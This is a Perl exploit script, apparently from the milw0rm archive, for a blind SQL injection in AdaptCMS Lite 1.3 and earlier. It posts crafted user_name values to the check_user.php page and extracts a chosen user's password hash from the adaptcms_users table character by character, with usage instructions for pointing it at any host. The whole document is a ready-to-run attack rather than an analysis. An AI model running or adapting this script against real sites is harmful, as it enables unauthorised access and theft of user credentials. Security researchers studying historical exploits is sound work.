#!/usr/bin/perl
# -----------------------------------------------------
# AdaptCMS Lite <= 1.3 Blind SQL Injection Exploit
# Discovered By StAkeR - StAkeR[at]hotmail[dot]it
# Discovered On 03/10/2008
# -----------------------------------------------------
# Download http://www.insanevisions.com/page/downloads
# -----------------------------------------------------
use strict;
use LWP::UserAgent;

my ($hash,$send,$sub) = (undef,undef,1);
my ($host,$uid) = @ARGV;

usage() unless $host =~ /^http:\/\/(.+?)$/i and $uid =~ /^[0-9]$/;

sub send_request
{
  my $param = shift @_;
  my $http = new LWP::UserAgent;
  my $post = $http->post($host.'/includes/check_user.php',[ user_name => $param ]);
  
  if($post->is_success)
  {
    return 38 unless $post->content =~ /yes/i;
  }
}

my @chars = (48..57, 97..102); 

for(0..32)
{
  foreach my $set(@chars)
  {
    $send = "' or ascii(substring((select password".
            " from adaptcms_users where id=$uid),$sub,1))=$set#";

    if(send_request($send) > 1)
    {
      $hash .= chr($set);
      $sub++;
      last;
    }
  }
}

sub usage
{
  print "[?] AdaptCMS Lite <= 1.3 Blind SQL Injection Exploit\n";
  print "[?] Usage: perl $0 http://[host] [user id]\n";
  exit;
}

if(defined $hash)
{
  print "[?] Hash: $hash\n";
  exit;
}
else
{
  print "[?] Exploit Failed!\n";
  exit;
}

# milw0rm.com [2008-10-03]
